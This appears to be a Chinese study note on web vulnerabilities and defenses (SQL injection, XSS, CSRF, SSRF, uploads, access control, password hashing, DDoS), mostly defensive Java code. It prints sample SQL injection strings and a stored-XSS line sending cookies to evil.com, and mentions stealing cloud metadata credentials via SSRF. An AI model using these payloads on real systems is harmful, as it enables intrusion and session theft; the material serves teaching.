---
title: 常见 Web 漏洞攻防
date: 2026-07-05
updated: 2026-07-05
tags:
  - 安全
  - SQL注入
  - XSS
  - CSRF
  - SSRF
categories:
  - 安全
---

### 3.1 SQL 注入

**攻击原理**：拼接用户输入构造 SQL，攻击者注入恶意片段。

```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
// 输入: ' OR '1'='1' --
// → SELECT * FROM users WHERE username = '' OR '1'='1' --'
// 输入: ' UNION SELECT id, password FROM admin_users --
```

**防御——预编译（Prepared Statement）**：

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
ps.setString(1, username);  // 参数绑定：值只当数据不当 SQL 语法
```

**预编译为什么能防？** SQL 模板先送数据库解析编译生成执行计划，参数值后送——结构与数据解耦，参数值不会被重新解析为 SQL 语法。

**MyBatis `#` vs `$`**：`#{}` 是预编译，JDBC 层走 `PreparedStatement.setString()`，值永远不当 SQL 执行；`${}` 是字符串替换，JDBC 层走 `Statement.execute(sqlString)`，SQL 由应用拼接后整条发送——数据库分不出哪部分是原始 SQL 哪部分是用户输入的。动态表名/排序必须用 `${}` 时，必须做白名单校验——`if (!ALLOWED_COLUMNS.contains(orderColumn)) throw`。

**面试追问——ORM 框架能彻底防 SQL 注入吗？** 不能。即使 Hibernate/MyBatis 默认启用了预编译，一旦用了原生 SQL（如 `entityManager.createNativeQuery()`）或 `${}`，注入仍然存在。另外，存储过程中使用 `EXEC` 拼接参数也会引入注入风险。

### 3.2 XSS（跨站脚本攻击）

攻击者将恶意脚本注入网页，在受害者浏览器中执行。

| 类型 | 攻击向量 | 触发方式 |
|------|----------|----------|
| 反射型 | URL 参数回显 | 点击恶意链接 |
| 存储型 | 脚本存数据库 | 访问正常页面（评论区→所有访问者中招） |
| DOM 型 | 前端 JS 操纵 DOM | 点击恶意链接 |

存储型示例：攻击者在评论区提交 `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>` → 所有访问评论页的用户 Cookie 被窃。

**防御**：

1. **输出编码**（最核心）：`<` → `&lt;`（HTML Entity）、`"` → `&quot;`。不同上下文不同规则：HTML 内容用 HTML Entity 编码；HTML 属性用属性编码（`"` → `&#x22;`）；JavaScript 上下文用 `\xHH` Unicode 编码；URL 参数用 `encodeURIComponent()`。React/Vue 默认 `{data}` 自动转义，`v-html`/`dangerouslySetInnerHTML` 需极度谨慎——只有在你完全信任的数据源或经过严格净化（DOMPurify）后才使用。
2. **CSP（Content Security Policy）**：`script-src 'self'` 只执行同源脚本，即使注入 `<script>` 浏览器也不执行——XSS 的最后防线。注意：用 `'nonce-xxx'` 可以按需开放特定内联脚本；`'unsafe-inline'` 会完全禁用 CSP 的 XSS 防护，绝对避免。
3. **HttpOnly Cookie**：Cookie 对 `document.cookie` 不可见，即使 XSS 成功也无法窃取会话。
4. **输入校验**：格式约束和长度限制。不能替代输出编码——合法输入在另一上下文可能变成恶意输出。

### 3.3 CSRF（跨站请求伪造）

**原理**：用户登录 bank.com（Cookie 有效），访问 evil.com。evil.com 隐藏表单向 bank.com/transfer 发 POST，浏览器自动携带 bank.com Cookie，服务端认为用户本人操作。

**三种防御**：

1. **CSRF Token**（最经典）：服务端生成随机 Token 埋入页面隐藏域，提交时校验。攻击者跨站无法读取目标页面 DOM（同源策略），无法获取 Token。每个会话独立生成防止固定 token 攻击。
2. **SameSite Cookie**（最省力的现代方案）：
- `SameSite=Strict`：任何跨站请求（GET/POST 等）都不带 Cookie。CSRF 被完全防住，但从邮件点链接打开网站也不带 Cookie，用户体验差。
- `SameSite=Lax`（Chrome 默认值）：跨站 POST/PUT/DELETE 不带 Cookie；跨站顶级导航 GET（`<a href>`、`<link rel="prerender">`）可带。能防御所有写操作 CSRF，不影响正常跳转体验。是不依赖 CSRF Token 的最推荐现代方案。
- `SameSite=None`：必须配合 `Secure` 属性（仅 HTTPS 生效），用于跨站 iframe 嵌入等场景。

**CSRF Token 与 SameSite 的关系**：两者互补而非替代。SameSite 是浏览器层面的第一道防线（有浏览器兼容性窗口），CSRF Token 是服务端层面的保险。关键业务操作建议两者都开启。
3. **Origin/Referer 校验**：检查请求来源是否为本站。某些环境会移除 Referer，不可作为唯一防御。

**SPA 场景**：JWT 放 `Authorization` header 而非 Cookie，跨站请求无法给 header 赋值，CSRF 天然不存在。

### 3.4 SSRF（服务端请求伪造）

攻击者控制服务端发起的请求目标，以服务端为跳板访问内网——读云元数据（AWS `169.254.169.254/latest/meta-data/` 拿临时凭证）、攻击内网 Redis/数据库、端口扫描。

**防御**：

```java
public boolean isValidUrl(String urlStr) {
    URL url = new URL(urlStr);
    // 1. 协议白名单：只允许 http/https，拒绝 file://、gopher://、dict://
    if (!Set.of("http", "https").contains(url.getProtocol())) return false;
    // 2. DNS 解析后过滤内网 IP（127/10/172.16/192.168 段）
    InetAddress addr = InetAddress.getByName(url.getHost());
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress())
        return false;
    return true;
}
```

**要点**：协议白名单非黑名单；先 DNS 后 IP 校验（防 `http://safe@10.0.0.1` 绕过）；禁止 302 跳转内网或对跳转目标也做校验；防 DNS Rebinding（连接时再次校验 IP、使用固定 DNS resolver 缓存 TTL）。

### 3.5 文件上传漏洞

攻击面：上传 WebShell（如 JSP/PHP），通过 URL 访问执行命令。

**多层防御**：

```java
public FileUploadResult upload(MultipartFile file) {
    // 1. 扩展名白名单（jpg/png/pdf）
    String ext = FilenameUtils.getExtension(file.getOriginalFilename()).toLowerCase();
    if (!ALLOWED_EXT.contains(ext)) throw new BadRequestException("类型不允许");

    // 2. Magic Number 校验（防改名 .jpg 绕过）
    // JPEG: FF D8 FF E0  PNG: 89 50 4E 47  GIF: 47 49 46 38
    if (!detectByMagicNumber(file).equals(ext)) throw new BadRequestException("伪装文件");

    // 3. 大小限制（10MB）+ 随机文件名防路径遍历
    String name = UUID.randomUUID() + "." + ext;

    // 4. 存在 Web 根目录外（/data/uploads/），攻击者无法通过 URL 直接访问
    file.transferTo(new File("/data/uploads/" + name));

    // 5. 图片重编码去除嵌入恶意代码
    if (isImage(ext)) ImageIO.write(ImageIO.read(file.getInputStream()), ext, new File(path));
}
```

**补充要点**：上传目录移除执行权限；防压缩炸弹（限制解压后大小和层级深度）。

### 3.6 越权漏洞

业务安全最常见的漏洞——权限框架配对了，代码漏了数据范围校验。

**水平越权**（同级访问他人数据）：`GET /api/orders/1002` 返回了别人的订单。

```java
// 错误：直接用 URL 中的 ID 查，查出任何人的数据
public Order getOrder(Long orderId) { return orderService.getById(orderId); }

// 正确：强制以当前用户为过滤条件
@GetMapping("/orders")
public List<Order> getMyOrders() {
    return orderService.getByUserId(SecurityUtils.getCurrentUserId());
    // URL 中不暴露可修改的 userId——根本上杜绝
}
```

**垂直越权**（低权限执行高权限操作）：普通用户直接调 `POST /api/admin/users/delete`。防御：`@PreAuthorize("hasRole('ADMIN')")`。

**核心原则**：操作主体 ID 只能从 `SecurityContextHolder` 获取，永远不信任前端传来的用户 ID。前端传 ID 只是告诉你操作哪个资源，是否有权操作必须由当前登录身份判断。

### 3.7 密码安全

**彩虹表攻击**：预计算大量"密码→哈希"映射表，泄露哈希后直接查表还原密码。

**加盐防彩虹表**：每用户随机 salt，`hash("pass" + "salt1") ≠ hash("pass" + "salt2")`。攻击者须为每个 salt 重新计算，成本从 O(1) 变为 O(N)。

**Bcrypt**——专为密码设计：

```java
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));  // cost=2^12=4096次迭代
boolean ok = BCrypt.checkpw(inputPassword, hash);  // 自动提取 salt 重新计算
```

关键设计：cost factor 随时间提升保持抗暴力破解成本；盐内置在结果中不单独存储；内存访问模式对 GPU/ASIC 不友好（对抗硬件加速暴力破解）。

**Argon2 系列**：Argon2id 混合模式是 2015 年密码哈希竞赛冠军，当前最推荐。核心思想——密码哈希要"**慢**"（0.1-0.5s/次），让用户体验无影响但暴力破解成本指数上升。**绝不**用 MD5/SHA256 存密码——它们为数据完整性设计，计算太快（每秒数十亿次）。

### 3.8 DDoS 防御

DDoS 通过海量请求占满带宽或服务器资源使服务不可用。纵深防御体系：

**SYN Cookie**（传输层）：TCP SYN Flood 攻击者大量发送 SYN 不完成握手，占满服务器 TCB 内存。SYN Cookie 在收到 SYN 时不分配内存，而是根据 IP/端口/时间戳/密钥算出 Cookie 作为 SYN+ACK 的序列号；收到 ACK 时验证确认号 = Cookie+1 才分配资源——把"状态保持"外包给网络，攻击者半连接零成本。

**应用层限流**（应用层）：Guava RateLimiter 每 IP 令牌桶限流；Nginx `limit_conn_zone` 限制同一 IP 并发连接数；WAF/验证码识别恶意流量。

**CDN 分散**：DNS 将流量分散到上百个边缘节点，攻击流量被稀释吸收；清洗后的正常流量才到源站。

**DDoS 分类与针对性防御**：

DDoS 按攻击层次分为三类，不同层次防御手段不同：
- **网络层攻击（L3/L4）**：SYN Flood、UDP Flood、ICMP Flood——用大量数据包占满带宽或连接表。防御靠运营商黑洞清洗/高防 IP/Anycast 分散流量。
- **协议层攻击（L4）**：SYN Flood、ACK Flood——利用协议握手缺陷消耗服务器资源。防御靠 SYN Cookie/SYN Proxy。
- **应用层攻击（L7）**：HTTP Flood、Slowloris——模拟正常用户行为，少量请求就能打挂应用。最难防御，因为攻击请求与正常请求难以区分。防御靠 WAF（请求特征分析）、验证码（人机识别）、限流 + 熔断。

Slowloris 原理特别值得了解：攻击者建立大量连接，每连接每隔 10 秒才发一个 HTTP 头部字节，用极慢的速度永远不完成请求。服务器上大量连接处于"等待请求体"状态，连接池耗尽。防御：Nginx `client_header_timeout 10s`、`limit_conn` 限制单 IP 连接数。

---
